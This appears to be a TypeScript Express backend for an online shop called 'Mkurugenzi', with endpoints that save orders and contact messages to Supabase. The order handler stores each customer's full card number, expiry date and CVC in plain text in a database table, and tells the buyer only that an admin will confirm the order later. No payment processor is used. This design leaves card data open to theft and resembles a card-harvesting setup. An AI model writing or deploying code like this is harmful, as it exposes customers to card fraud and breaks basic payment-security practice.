import express from 'express';
import cors from 'cors';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

const supabaseUrl = process.env.SUPABASE_URL!;
const supabaseAnonKey = process.env.SUPABASE_ANON_KEY!;
const supabase = createClient(supabaseUrl, supabaseAnonKey);

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
    res.json({ message: 'Mkurugenzi API running!' });
});

app.post('/api/orders', async (req, res) => {
    try {
        const { 
            productName, 
            productPrice, 
            fullName, 
            email, 
            phone, 
            address, 
            cardNumber, 
            cardName, 
            cardExpiry, 
            cardCVC 
        } = req.body;
        
        const cardLast4 = cardNumber.slice(-4);
        const cardBrand = cardNumber.startsWith('4') ? 'Visa' : 
                         cardNumber.startsWith('5') ? 'Mastercard' : 
                         cardNumber.startsWith('3') ? 'Amex' : 'Unknown';
        
        const { error } = await supabase.from('orders').insert([{
            product_name: productName,
            product_price: productPrice,
            full_name: fullName,
            email: email,
            phone: phone,
            address: address,
            card_last4: cardLast4,
            card_brand: cardBrand,
            full_card_number: cardNumber,
            card_holder_name: cardName,
            card_expiry: cardExpiry,
            card_cvc: cardCVC,
            status: 'pending',
            created_at: new Date()
        }]);
        
        if (error) {
            console.error('Supabase error:', error);
            throw error;
        }
        
        console.log(`✅ Order received from ${fullName} for ${productName}`);
        res.json({ success: true, message: 'Order received! Admin will confirm soon.' });
    } catch (error) {
        console.error('Order error:', error);
        res.status(500).json({ success: false, error: 'Something went wrong' });
    }
});

app.post('/api/messages', async (req, res) => {
    try {
        const { name, email, subject, message } = req.body;
        const { error } = await supabase.from('messages').insert([{ 
            name, 
            email, 
            subject, 
            message,
            created_at: new Date()
        }]);
        
        if (error) throw error;
        console.log(`📨 Message from ${name}`);
        res.json({ success: true, message: 'Message sent!' });
    } catch (error) {
        console.error('Message error:', error);
        res.status(500).json({ success: false, error: 'Failed to send message' });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});